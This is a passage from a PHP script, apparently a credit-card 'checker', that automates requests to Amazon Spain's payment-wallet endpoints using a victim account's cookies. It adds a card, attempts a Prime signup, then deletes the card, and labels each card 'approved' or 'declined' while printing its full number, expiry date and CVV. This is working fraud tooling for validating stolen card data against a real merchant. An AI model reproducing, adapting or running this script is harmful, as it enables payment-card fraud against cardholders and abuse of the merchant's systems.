curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-jsEnabled=true&ppw-widgetState='.$pp1.'&ppw-widgetEvent=StartEditEvent&ppw-iid='.$ppid.'&ppw-paymentMethodType=Card&ppw-isDefaultPaymentMethod=false');

$response = curl_exec($ch);

$pp2 = getString($response, 'name=\"ppw-widgetState\" value=\"', '\"');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.es/payments-portal/data/widgets2/v1/customer/'.$userid.'/continueWidget?sif_profile=APX-Encrypt-All-EU');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.amazon.es',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'accept: application/json, text/javascript, */*; q=0.01',
    'origin: https://www.amazon.es',
    'referer: https://www.amazon.es/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'priority: u=1, i',
]);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-widgetEvent%3AStartDeleteEvent%3A%7B%22iid%22%3A%22'.$tok1.'%22%2C%22paymentMethodCode%22%3A%22CC%22%7D=Eliminar+de+la+cartera&ppw-jsEnabled=true&ppw-widgetState='.$pp2.'&ie=UTF-8&ppw-accountHolderName=Vitin+lotter&ppw-expirationDate_month='.$mes.'&ppw-expirationDate_year='.$ano.'');

$response = curl_exec($ch);

$pp3 = trazer($response, 'name=\"ppw-widgetState\" value=\"','\"',1);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.es/payments-portal/data/widgets2/v1/customer/'.$userid.'/continueWidget');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.amazon.es',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'accept: application/json, text/javascript, */*; q=0.01',
    'origin: https://www.amazon.es',
    'referer: https://www.amazon.es/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'priority: u=1, i',
]);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-jsEnabled=true&ppw-widgetState='.$pp3.'&ie=UTF-8&ppw-widgetEvent=DeleteInstrumentEvent');

$response = curl_exec($ch);

}




if (strpos($retornooo, 'We’re sorry. We’re unable to complete your Prime signup at this time. Please try again later.')) {
fwrite("<font style=color:#00ff88><span class='badge badge-soft-success'>Aprovada </span> ➔ $cc|$mes|$ano|$cvv</font> ➜ REMOVIDO:$msg<font style=color:#00ff88> $nome</font> ➜ <font style=color:#00ff88>$bin ➔ Retorno: <span class='badge badge-soft-success'>[CARTÃO APROVADO]</span><b>Tempo de Resposta: (" . (time() - $time) . " SEG)</b></font><br>");
    

    echo "<font style=color:#00ff88><span class='badge badge-soft-success'>Aprovada </span> ➔ $cc|$mes|$ano|$cvv</font> ➜ REMOVIDO:$msg<font style=color:#00ff88> $nome</font> ➜ <font style=color:#00ff88>$bin ➔ Retorno: <span class='badge badge-soft-success'>[CARTÃO APROVADO]</span><b>Tempo de Resposta: (" . (time() - $time) . " SEG) ➔ @vitin_dev</b></font><br>";
            
}elseif (strpos($retornooo, 'InvalidInput')) {
                    
    echo "<font style=color:#ff0000><span class='badge badge-soft-danger'>Reprovada </span> ➔ $cc|$mes|$ano|$cvv</font> ➜ REMOVIDO:$msg<font style=color:#ff0000> $nome</font> ➜ <font style=color:#ff0000>$bin ➔ Retorno: <span class='badge badge-soft-danger'>[CARD INVALIDO] </span><b>Tempo de Resposta: (" . (time() - $time) . " SEG) ➔ @vitin_dev</b></font><br>";
    curl_close($curl);
    exit();
                
} elseif (strpos($retornooo, 'HARDVET_VERIFICATION_FAILED')) {
                
    echo "<font style=color:#f6ff00><span class='badge badge-soft-danger'>Reprovada </span> ➔ $cc|$mes|$ano|$cvv</font> ➜ REMOVIDO:$msg<font style=color:#0789f2> $nome</font> ➜ <font style=color:#f6ff00>$bin ➔ Retorno: <span class='badge badge-soft-warning'>[CARTAO RECUSADO]</span><b>Tempo de Resposta: (" . (time() - $time) . " SEG) ➔ @vitin_dev</b></font><br>";
    curl_close($curl);
    exit();
} else {
    echo "<font style=color:#ff0000><span class='badge badge-soft-danger'>Reprovada </span> ➔ $cc|$mes|$ano|$cvv</font> ➜ REMOVIDO:$msg<font style=color:#ff0000> $nome</font> ➜ <font style=color:#ff0000>$bin ➔ Retorno: <span class='badge badge-soft-danger'>[❌COOKIES DESATUALIZADO]</span><b>Tempo de Resposta: (" . (time() - $time) . " SEG) ➔ @vitin_dev</b></font><br>";
    curl_close($curl);
    exit();
}


?>

